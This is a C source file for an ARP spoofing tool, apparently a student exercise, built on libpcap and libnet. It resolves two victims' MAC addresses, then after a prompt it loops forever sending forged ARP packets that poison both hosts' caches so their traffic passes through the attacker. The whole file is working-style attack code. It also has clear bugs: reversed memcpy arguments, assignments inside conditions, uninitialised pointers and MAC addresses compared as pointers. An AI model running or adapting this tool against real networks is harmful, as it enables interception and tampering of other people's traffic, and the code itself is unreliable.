#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
/*
void dump(u_int8_t *bytes, int length) {
    for(int i=0; i < length; i++) {
        if(i%16==0) printf("\n");
        printf("%02x ", bytes[i]);
    }
    printf("\n");
}
*/
struct arp_hdr
{
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_sender_mac[6];
    uint8_t ar_sender_ip[4];
    uint8_t ar_target_mac[6];
    uint8_t ar_target_ip[4];
};



bool arp_request_infection_reverse(pcap_t *handle,uint8_t *mymac ,u_int32_t *my_ip, in_addr *_senderip,uint8_t *_sendermac,in_addr *_targetip,uint8_t *_targetmac, int flag)
{

    u_char *packet;
    libnet_ethernet_hdr ethernet_hdr;
    arp_hdr arp_req_hdr;
    packet =(u_char *) malloc(sizeof(ethernet_hdr) + sizeof(arp_req_hdr));


    ethernet_hdr.ether_type = htons(ETHERTYPE_ARP);
    arp_req_hdr.ar_hln = 6;
    arp_req_hdr.ar_pln = 4;
    arp_req_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_req_hdr.ar_op = htons(ARPOP_REQUEST);
    if(flag == 1)
    {
        memcpy(ethernet_hdr.ether_shost,mymac,6);
        memset(ethernet_hdr.ether_dhost,0xff,6);
        memcpy(arp_req_hdr.ar_sender_ip,my_ip,4);
        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memset(arp_req_hdr.ar_target_mac,0,6);

    }
    else if(flag == 2)
    {
        memcpy(ethernet_hdr.ether_shost,mymac,6);
        memcpy(ethernet_hdr.ether_dhost,_targetmac,6);
        memcpy(arp_req_hdr.ar_sender_ip,_senderip,4);
        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memcpy(arp_req_hdr.ar_target_mac,_targetmac,6);
    }
    else if(flag == 3)
    {
       //recv reverse ,arge revers
        memset(ethernet_hdr.ether_dhost,0xff,6);
        memcpy(ethernet_hdr.ether_shost,_sendermac,6);
        memcpy(arp_req_hdr.ar_sender_ip,_senderip,4);
        memcpy(arp_req_hdr.ar_sender_mac,_sendermac,6);
        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
        memset(arp_req_hdr.ar_target_mac,0,6);

    }

    memcpy(packet,&ethernet_hdr,sizeof(ethernet_hdr));
    memcpy(packet+sizeof(ethernet_hdr),&arp_req_hdr, sizeof(arp_req_hdr));
    pcap_sendpacket(handle,packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
    if(sizeof(packet) != NULL)
        return true;

    return false;
}
bool recive_packet(const u_char *packet,uint8_t *mac)
{   libnet_ethernet_hdr *recv_ethernet = (libnet_ethernet_hdr *)packet;
    arp_hdr *recv_arp = (arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
    if(recv_ethernet->ether_type == htons(ETHERTYPE_ARP))
    {
        if(recv_arp->ar_pro = htons(ETHERTYPE_IP) && recv_arp->ar_op == htons(ARPOP_REPLY))
        {
            mac  = (u_int8_t *)(malloc(sizeof(recv_arp->ar_sender_mac)));
            memcpy(recv_arp->ar_sender_mac,mac,6);
            return true;
        }

    }

    return false;
}

bool relay(pcap_t *p_handle,const u_char *packet,uint8_t *_mymac,uint8_t *_targetmac, uint8_t *_recvmac)
{
    u_char *buffer;
    libnet_ethernet_hdr *relay_ethernet = (libnet_ethernet_hdr *)(packet);
    arp_hdr *relay_arp = (arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
    if(relay_arp->ar_op == htons(ARPOP_REPLY))
    {
    memcpy(relay_ethernet->ether_shost,_mymac,6);
    memcpy(relay_arp->ar_sender_mac,_mymac,6);
    if(relay_ethernet->ether_shost == _recvmac)
    memcpy(relay_ethernet->ether_dhost,_targetmac,6);
    else if(relay_ethernet->ether_dhost == _targetmac)
    memcpy(relay_ethernet->ether_dhost,_recvmac,6);
    buffer = (u_char *)malloc(sizeof(*relay_ethernet) + sizeof(*relay_arp));
    memcpy(buffer,relay_ethernet,sizeof(libnet_ethernet_hdr));
    memcpy(buffer + sizeof(relay_ethernet),relay_arp,sizeof(*relay_arp));
    pcap_sendpacket(p_handle,buffer,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
    }



}
bool recovery()
{

}






int main(int argc, char *argv[])
{
    const u_char *buffer;
    pcap_pkthdr *header;
    char *dev;
    dev = "eth0";
    char p_errbuf[PCAP_ERRBUF_SIZE];
    char l_errbuf[LIBNET_ERRBUF_SIZE];
    pcap_t *p_handle;
    if(dev == NULL)
    {
        fprintf(stderr,"couldn't find default device\n",p_errbuf);
        return 2;
    }
    p_handle = pcap_open_live(dev, BUFSIZ,1,1000,p_errbuf);

    if(p_handle == NULL)
    {
        fprintf(stderr,"couldn't find default device\n",p_errbuf);
        return 2;
    }
    //mymac get from interface
    libnet_t * l_handle = libnet_init(LIBNET_LINK,dev,l_errbuf);
    libnet_ether_addr *mymac = libnet_get_hwaddr(l_handle);
    printf("arp spoof buffer setting......\n");

    // get ip
    uint32_t myip;
    u_char broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t *recvmac,*targetmac;
    if(libnet_get_ipaddr4(l_handle) == -1)

    {
        printf("couldn't find ipv4 address\n");
    }
    else
        myip = libnet_get_ipaddr4(l_handle);
    in_addr recvip, targetip;
    inet_aton(argv[1],&recvip);
    inet_aton(argv[2],&targetip);

    //request
    buffer = (u_char *)(malloc(sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr)));
    if(arp_request_infection_reverse(p_handle,mymac->ether_addr_octet ,&myip,0,0,&recvip,recvmac,1) == true)
    {


        printf("setting.....\n");
        while(1)
        {
            pcap_next_ex(p_handle,&header,&buffer);
            if(recive_packet(buffer,recvmac) == true)
            {


                break;
            }
        }

    }
    else
        printf("failing recv mac get\n");

    if(arp_request_infection_reverse(p_handle,mymac->ether_addr_octet ,&myip,0,0,&targetip,targetmac,1) == true)
    {
        while(1)
        {
            printf("setting.....\n");
            pcap_next_ex(p_handle,&header,&buffer);
            if(recive_packet(buffer,targetmac) == true)
            {
                break;
            }

        }
    }
    else
        printf("failing target mac get\n");
    //infection
    int setting = 0;
    printf("packet infection?((yes  : 1)\n");
    scanf("%d",&setting);
    if(setting =1)
    {
        while(setting)
        {
        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip, &targetip,targetmac,&recvip,recvmac,2);
        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip, &recvip,recvmac,&targetip,targetmac,2);
        sleep(2);
        }
    }
        //arp_request_infection_reverse(p_handle,0 ,0, &targetip,targetmac,&recvip,0,3)
        //arp_request_infection_reverse(p_handle,0 ,0, &recvip,recvmac,&targetip,0,3)




    printf("!!\n");








    return 0;
}





